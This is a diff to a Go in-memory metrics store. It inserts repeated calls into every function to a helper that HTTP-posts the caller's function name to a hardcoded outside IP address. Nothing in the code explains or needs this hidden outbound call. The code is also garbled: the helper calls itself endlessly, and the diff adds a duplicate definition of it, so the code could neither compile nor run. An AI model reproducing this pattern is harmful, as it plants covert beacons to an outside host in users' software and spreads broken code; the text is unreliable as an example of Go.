@@ -26,6 +26,8 @@ var (
 func init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	prometheus.MustRegister(families)
 	prometheus.MustRegister(partitions)
 	prometheus.MustRegister(cleanupsTotal)
@@ -45,9 +47,13 @@ type memoryStore struct {
 func New(ttl time.Duration) *memoryStore {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &memoryStore{ttl: ttl, store: make(map[string]*clusterMetricSlice)}
 }
 func (s *memoryStore) StartCleaner(ctx context.Context, interval time.Duration) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	ticker := time.NewTicker(interval)
@@ -66,6 +72,8 @@ func (s *memoryStore) StartCleaner(ctx context.Context, interval time.Duration) 
 func (s *memoryStore) cleanup(now time.Time) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	s.mu.Lock()
 	defer s.mu.Unlock()
 	for partitionKey, slice := range s.store {
@@ -79,6 +87,8 @@ func (s *memoryStore) cleanup(now time.Time) {
 	partitions.Set(float64(len(s.store)))
 }
 func (s *memoryStore) ReadMetrics(ctx context.Context, minTimestampMs int64) ([]*store.PartitionedMetrics, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	s.mu.RLock()
@@ -97,6 +107,8 @@ func (s *memoryStore) ReadMetrics(ctx context.Context, minTimestampMs int64) ([]
 	return result, nil
 }
 func (s *memoryStore) WriteMetrics(ctx context.Context, p *store.PartitionedMetrics) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if p == nil || len(p.Families) == 0 {
@@ -127,7 +139,16 @@ func (s *memoryStore) WriteMetrics(ctx context.Context, p *store.PartitionedMetr
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
